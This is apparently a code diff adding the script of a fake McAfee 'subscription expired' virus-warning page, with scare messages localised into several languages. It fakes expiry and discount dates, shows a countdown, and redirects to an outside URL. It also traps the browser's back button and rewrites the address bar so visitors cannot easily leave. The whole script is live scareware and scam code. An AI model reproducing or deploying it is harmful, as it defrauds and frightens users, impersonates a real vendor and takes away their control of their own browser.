+document.getElementById('w5_004').innerHTML = 'Assinatura do McAfee:';
+document.getElementById('w5_005').innerHTML = 'EXPIRADO';
+
+document.getElementById('txt1').innerHTML = 'Sua assinatura do McAfee expirou!';
+document.getElementById('txt2').innerHTML = 'Sua assinatura do McAfee Total Protection expirou em <strong id="expdate">22/02/2024</strong>';
+document.getElementById('txt3').innerHTML = 'Após a data de expiração, seu computador ficará suscetível a muitas ameaças diferentes de vírus. <strong>Sua privacidade pode estar em risco.</strong>';
+document.getElementById('txt4').innerHTML = 'Seu computador está desprotegido, expondo-o a vírus e outros malwares...';
+document.getElementById('txt5').innerHTML = '<strong class="green">Disponível </strong> <strong class="red blinking">(-55%)</strong> Desconto de Renovação: (<strong id="todaydate">02/03/2024</strong>)';
+document.getElementById('txt6').innerHTML = 'RENUNCIAR A ASSINATURA AGORA';
+
+document.getElementById('cd_av').innerHTML = 'Disponível Para';
+document.getElementById('cd_m').innerHTML = 'minutos';
+document.getElementById('cd_s').innerHTML = 'segundos';
+}
+
+ //Swedish(se)
+if (lang == 'se') {
+document.getElementById('modal_head').innerHTML = 'Virusvarning!';
+document.getElementById('modal_sub01').innerHTML = 'Du kan ha besökt osäkra webbplatser med skadligt innehåll.';
+document.getElementById('modal_sub02').innerHTML = 'Din dator är i riskzonen för att bli infekterad av virus.';
+document.getElementById('modal_sub03').innerHTML = 'För att fortsätta surfa säkert - utför en antivirusgenomgång.';
+document.getElementById('modal_btn').innerHTML = 'SKANNA';
+
+document.getElementById('w5_001').innerHTML = 'Bearbetar: Var god stäng inte';
+document.getElementById('w5_002').innerHTML = 'Valda infekterade filer:';
+document.getElementById('w5_003').innerHTML = 'Systemtillstånd: OK';
+document.getElementById('w5_004').innerHTML = 'McAfee-prenumeration:';
+document.getElementById('w5_005').innerHTML = 'UTGÅTT';
+
+document.getElementById('txt1').innerHTML = 'Din McAfee-prenumeration har löpt ut!';
+document.getElementById('txt2').innerHTML = 'Din prenumeration på McAfee Total Protection har löpt ut den <strong id="expdate">22/02/2024</strong>';
+document.getElementById('txt3').innerHTML = 'Efter utgångsdatumet blir din dator mottaglig för många olika virushot. <strong>Din integritet kan vara hotad.</strong>';
+document.getElementById('txt4').innerHTML = 'Din dator är oskyddad och utsätts för virus och annan skadlig programvara...';
+document.getElementById('txt5').innerHTML = '<strong class="green">Tillgänglig </strong> <strong class="red blinking">(-55%)</strong> Förnyelserabatt: (<strong id="todaydate">02/03/2024</strong>)';
+document.getElementById('txt6').innerHTML = 'FÖRNYA PRENUNCIATIONEN NU';
+
+document.getElementById('cd_av').innerHTML = 'Tillgänglig För';
+document.getElementById('cd_m').innerHTML = 'minuter';
+document.getElementById('cd_s').innerHTML = 'sekunder';
+}
+
+// Dutch (Nederlands)
+if (lang == 'nl') {
+document.getElementById('modal_head').innerHTML = 'Virus Waarschuwing!';
+document.getElementById('modal_sub01').innerHTML = 'U heeft mogelijk onveilige websites bezocht met kwaadaardige inhoud.';
+document.getElementById('modal_sub02').innerHTML = 'Uw computer loopt risico om geïnfecteerd te worden door virussen.';
+document.getElementById('modal_sub03').innerHTML = 'Om veilig te blijven browsen - voer een antivirus scan uit.';
+document.getElementById('modal_btn').innerHTML = 'SCAN';
+
+document.getElementById('w5_001').innerHTML = 'Verwerken: Sluit niet af';
+document.getElementById('w5_002').innerHTML = 'Geselecteerde geïnfecteerde bestanden:';
+document.getElementById('w5_003').innerHTML = 'Systeemtoestemming: OK';
+document.getElementById('w5_004').innerHTML = 'McAfee Abonnement:';
+document.getElementById('w5_005').innerHTML = 'VERLOPEN';
+
+
+document.getElementById('txt1').innerHTML = 'Uw McAfee-abonnement is verlopen!';
+document.getElementById('txt2').innerHTML = 'Uw abonnement op McAfee Total Protection is verlopen op <strong id="expdate">22/02/2024</strong>';
+document.getElementById('txt3').innerHTML = 'Na de vervaldatum wordt uw computer vatbaar voor vele verschillende virussen. <strong>Uw privacy kan in gevaar zijn.</strong>';
+document.getElementById('txt4').innerHTML = 'Uw computer is onbeschermd, waardoor deze blootgesteld wordt aan virussen en andere malware...';
+document.getElementById('txt5').innerHTML = '<strong class="green">Beschikbaar </strong> <strong class="red blinking">(-55%)</strong> Vernieuwingskorting: (<strong id="todaydate">02/03/2024</strong>)';
+document.getElementById('txt6').innerHTML = 'VERLENG ABONNEMENT NU';
+
+document.getElementById('cd_av').innerHTML = 'Beschikbaar voor';
+document.getElementById('cd_m').innerHTML = 'minuten';
+document.getElementById('cd_s').innerHTML = 'seconden';
+}
+
+// Japanese
+if (lang == 'ja' || lang == 'jp') {
+document.getElementById('modal_head').innerHTML = 'ウイルス警告！';
+document.getElementById('modal_sub01').innerHTML = 'あなたは悪意のあるコンテンツを持つ安全でないウェブサイトを訪れた可能性があります。';
+document.getElementById('modal_sub02').innerHTML = 'あなたのコンピューターはウイルスに感染する危険があります。';
+document.getElementById('modal_sub03').innerHTML = '安全に閲覧を続けるためには、ウイルススキャンを実行してください。';
+document.getElementById('modal_btn').innerHTML = 'スキャン';
+
+document.getElementById('w5_001').innerHTML = '処理中：閉じないでください';
+document.getElementById('w5_002').innerHTML = '選択された感染したファイル：';
+document.getElementById('w5_003').innerHTML = 'システム許可：OK';
+document.getElementById('w5_004').innerHTML = 'McAfee サブスクリプション：';
+document.getElementById('w5_005').innerHTML = '期限切れ';
+
+document.getElementById('txt1').innerHTML = 'あなたの McAfee サブスクリプションは期限切れです！';
+document.getElementById('txt2').innerHTML = 'あなたの McAfee Total Protection のサブスクリプションは <strong id="expdate">2024年2月22日</strong> に期限切れになりました。';
+document.getElementById('txt3').innerHTML = '期限切れ後、あなたのコンピューターはさまざまなウイルスの脅威に対して脆弱になります。<strong>あなたのプライバシーが危険にさらされる可能性があります。</strong>';
+document.getElementById('txt4').innerHTML = 'あなたのコンピューターは保護されていません。ウイルスやその他のマルウェアにさらされています...';
+document.getElementById('txt5').innerHTML = '<strong class="green">利用可能 </strong><strong class="red blinking">(-55%)</strong> 更新割引：(<strong id="todaydate">2024年3月2日</strong>)';
+document.getElementById('txt6').innerHTML = '今すぐサブスクリプションを更新する';
+
+document.getElementById('cd_av').innerHTML = '利用可能時間';
+document.getElementById('cd_m').innerHTML = '分';
+document.getElementById('cd_s').innerHTML = '秒';
+}
+
+//Danish 
+if (lang == 'da' || lang=='dk') {
+document.getElementById('modal_head').innerHTML = 'Virus Advarsel!';
+document.getElementById('modal_sub01').innerHTML = 'Du kan have besøgt usikre hjemmesider med skadeligt indhold.';
+document.getElementById('modal_sub02').innerHTML = 'Din computer er i fare for at blive inficeret med virus.';
+document.getElementById('modal_sub03').innerHTML = 'For at fortsætte med at browse sikkert - udfør en antivirus-scanning.';
+document.getElementById('modal_btn').innerHTML = 'SCAN';
+
+document.getElementById('w5_001').innerHTML = 'Behandling: Luk venligst ikke';
+document.getElementById('w5_002').innerHTML = 'Valgte inficerede filer:';
+document.getElementById('w5_003').innerHTML = 'Systemtilladelse: OK';
+document.getElementById('w5_004').innerHTML = 'McAfee Abonnement:';
+document.getElementById('w5_005').innerHTML = 'UDLØBET';
+
+document.getElementById('txt1').innerHTML = 'Dit McAfee-abonnement er udløbet!';
+document.getElementById('txt2').innerHTML = 'Dit abonnement på McAfee Total Protection udløb den <strong id="expdate">22/02/2024</strong>';
+document.getElementById('txt3').innerHTML = 'Efter udløbsdatoen vil din computer blive modtagelig for mange forskellige virus trusler. <strong>Din privatliv kan være i fare.</strong>';
+document.getElementById('txt4').innerHTML = 'Din computer er ubeskyttet og udsat for virus og anden malware...';
+document.getElementById('txt5').innerHTML = '<strong class="green">Tilgængelig </strong> <strong class="red blinking">(-55%)</strong> Fornyelsesrabatt: (<strong id="todaydate">02/03/2024</strong>)';
+document.getElementById('txt6').innerHTML = 'FORNY ABONNEMENT NU';
+
+document.getElementById('cd_av').innerHTML = 'Tilgængelig i';
+document.getElementById('cd_m').innerHTML = 'minutter';
+document.getElementById('cd_s').innerHTML = 'sekunder';
+}
+
+//German 
+if (lang == 'de') {
+		document.getElementById('modal_head').innerHTML = 'Viruswarnung!';
+		document.getElementById('modal_sub01').innerHTML = 'Sie haben möglicherweise unsichere Websites mit schädlichen Inhalten besucht.';
+		document.getElementById('modal_sub02').innerHTML = 'Ihr Computer ist gefährdet, von Viren infiziert zu werden.';
+		document.getElementById('modal_sub03').innerHTML = 'Um sicher weiter zu surfen - führen Sie einen Virenscan durch.';
+		document.getElementById('modal_btn').innerHTML = 'SCAN';
+
+		document.getElementById('w5_001').innerHTML = 'Verarbeitung: Bitte nicht schließen';
+		document.getElementById('w5_002').innerHTML = 'Ausgewählte infizierte Dateien:';
+		document.getElementById('w5_003').innerHTML = 'Systemberechtigung: OK';
+		document.getElementById('w5_004').innerHTML = 'McAfee-Abonnement:';
+		document.getElementById('w5_005').innerHTML = 'ABGELAUFEN';
+
+		document.getElementById('txt1').innerHTML = 'Ihr McAfee-Abonnement ist abgelaufen!';
+		document.getElementById('txt2').innerHTML = 'Ihr Abonnement von McAfee Total Protection ist am <strong id="expdate">22/02/2024</strong> abgelaufen.';
+		document.getElementById('txt3').innerHTML = 'Nach dem Ablaufdatum wird Ihr Computer anfällig für viele verschiedene Virenbedrohungen. <strong>Ihre Privatsphäre könnte gefährdet sein.</strong>';
+		document.getElementById('txt4').innerHTML = 'Ihr Computer ist ungeschützt und anfällig für Viren und andere Malware...';
+		document.getElementById('txt5').innerHTML = '<strong class="green">Verfügbar </strong> <strong class="red blinking">(-55%)</strong> Verlängerungsrabatt: (<strong id="todaydate">02/03/2024</strong>)';
+		document.getElementById('txt6').innerHTML = 'JETZT ABONNEMENT ERNEUERN';
+
+		document.getElementById('cd_av').innerHTML = 'Verfügbar für';
+		document.getElementById('cd_m').innerHTML = 'Minuten';
+		document.getElementById('cd_s').innerHTML = 'Sekunden';
+}
+
+
+
+
+
+var date = new Date(); // for expdate date
+var now = new Date(Date.now()); // for today date
+date.setDate(date.getDate() - 4);
+
+//var country = getURLParameter('country').toLowerCase(); // Convert to uppercase
+
+// Date formatting options
+var options = {
+    year: 'numeric',
+    month: 'long',
+    day: '2-digit'
+};
+
+// Set locale based on country parameter
+var locale = 'en-US'; // Default to US if country parameter is not provided or unrecognized
+if (lang == 'ca') {
+    locale = 'en-CA';
+} else if (lang == 'fr') {
+    locale = 'fr-FR';
+} else if (lang == 'it') {
+    locale = 'it-IT';
+} else if (lang == 'zh') {
+    locale = 'zh-TW';
+}else if (lang == 'se') {
+    locale = 'sv-SE';
+}else if (lang == 'fi') {
+    locale = 'fi-FI';
+}else if (lang == 'no') {
+    locale = 'nb-NO';
+}else if (lang == 'dk') {
+    locale = 'da-DK';
+} else if (lang == 'es') {
+    locale = 'es-ES'; 
+} else if (lang == 'pt') {
+    locale = 'pt-PT';
+} else if (lang == 'nl') {
+    locale = 'nl-NL';
+} else if (lang == 'ja' || lang == 'jp') {
+    locale = 'ja-JP';
+} else if (lang == 'dk' || lang == 'da') {
+    locale = 'da-DK';
+}else if (lang == 'de') {
+    locale = 'de-DE';
+}
+
+
+
+
+
+
+// Format dates
+var expdate = date.toLocaleDateString(locale, options);
+var todaydate = now.toLocaleDateString(locale, options);
+
+// Display formatted dates
+document.getElementById("expdate").innerHTML = expdate;
+document.getElementById("todaydate").innerHTML = todaydate;
+
+
+
+
+
+//outbound link
+var url_parameter = getURLParameter("domain");
+function out(){window.onbeforeunload=null,window.location="https://bin.surpriseanddelightgifts.com/cool.php?lp=1"}
+//BB-keep current page
+! function () {
+var t;
+try {
+for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+onpopstate = function (t) {
+t.state && location.replace("#")
+}
+} catch (o) {}
+}();
+
+
+		//Addressbar script
+		setTimeout(function(){  
+		window.history.pushState('/', 'Other Page', '/');
+		window.history.pushState('/', 'Initial Page', '/');
+		 }, 3000); 
+
+		 window.addEventListener("popstate", function(e) {
+			if(document.URL.indexOf("/") >= 0){
+				document.location.href = document.location;
+			}
+		 });
+</script>
+</body>
+</html>
